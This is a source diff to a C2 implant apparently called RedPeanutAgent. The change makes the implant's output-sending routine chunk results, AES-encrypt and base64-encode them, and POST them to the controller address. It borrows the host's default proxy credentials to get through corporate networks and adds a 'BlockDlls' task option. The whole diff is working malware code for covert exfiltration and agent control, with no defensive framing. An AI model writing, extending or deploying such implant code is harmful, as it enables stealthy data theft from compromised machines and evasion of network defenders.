@@ -101,31 +101,67 @@ namespace RedPeanutAgent.Core
         //AES
         public static void SendOutputHttp(string taskinstance, string output, CookiedWebClient wc, byte[] aeskey, byte[] aesiv, string rpaddress, string param, string agentid, string agentpivot = null)
         {
+            wc.UseDefaultCredentials = true;
+            wc.Proxy = WebRequest.DefaultWebProxy;
+            wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+
             ResponseMsg respmsg = new ResponseMsg
             {
                 TaskInstanceid = taskinstance,
                 SystemInfo = GetSystemInfo(),
                 Chunked = false,
                 Agentid = agentid,
-                Number = 1,
-                Data = output
+                Number = 1
             };
 
-            if (agentpivot != null)
-                respmsg.AgentPivot = agentpivot;
+            int chunksize = 1024000;
+            //Response need to be splitted
+            if (output.Length > chunksize)
+                respmsg.Chunked = true;
+
+            //Chunk number
+            int chunknum = output.Length / chunksize;
+            if (output.Length % chunksize != 0)
+                chunknum++;
+
+            respmsg.Number = chunknum;
+
+            int iter = 0;
+            do
+            {
+                int remaining = output.Length - (iter * chunksize);
+                if (remaining > chunksize)
+                    remaining = chunksize;
+
+                respmsg.Data = output.Substring(iter * chunksize, remaining);
+
+                string respmsgjson = new JavaScriptSerializer().Serialize(respmsg);
+                //string respmsgjson = JsonConvert.SerializeObject(respmsg, Formatting.Indented);
+                var response = Crypto.Aes.EncryptAesMessage(respmsgjson, aeskey, aesiv);
+
+                string post = String.Format("{0}={1}", param, Convert.ToBase64String(response));
 
 
-            string respmsgjson = new JavaScriptSerializer().Serialize(respmsg);
-            //string respmsgjson = JsonConvert.SerializeObject(respmsg, Formatting.Indented);
-            var response = Crypto.Aes.EncryptAesMessage(respmsgjson, aeskey, aesiv);
 
-            string post = String.Format("{0}={1}", param, Convert.ToBase64String(response));
+                string resp = wc.UploadString(rpaddress, post);
 
-            wc.UseDefaultCredentials = true;
-            wc.Proxy = WebRequest.DefaultWebProxy;
-            wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+                iter++;
+            }
+            while (chunknum > iter);
 
-            string resp = wc.UploadString(rpaddress, post);
+            if(respmsg.Chunked)
+            {
+                
+                respmsg.Data = "";
+                respmsg.Number = 0;
+
+                string respmsgjson = new JavaScriptSerializer().Serialize(respmsg);
+                var response = Crypto.Aes.EncryptAesMessage(respmsgjson, aeskey, aesiv);
+
+                string post = String.Format("{0}={1}", param, Convert.ToBase64String(response));
+                string resp = wc.UploadString(rpaddress, post);
+            }
+
         }
 
         //AES
@@ -418,6 +454,11 @@ namespace RedPeanutAgent.Core
             public bool Managed { get; set; }
         }
 
+        public class BlockDlls
+        {
+            public bool Block { get; set; }
+        }
+
         public class TaskMsg
         {
             public string Agentid { get; set; }
@@ -431,6 +472,7 @@ namespace RedPeanutAgent.Core
             public StandardConfig StandardTask { get; set; }
             public FileDownloadConfig DownloadTask { get; set; }
             public InjectionManaged InjectionManagedTask { get; set; }
+            public BlockDlls BlockDllsTask { get; set; }
         }
 
         public class ResponseMsg
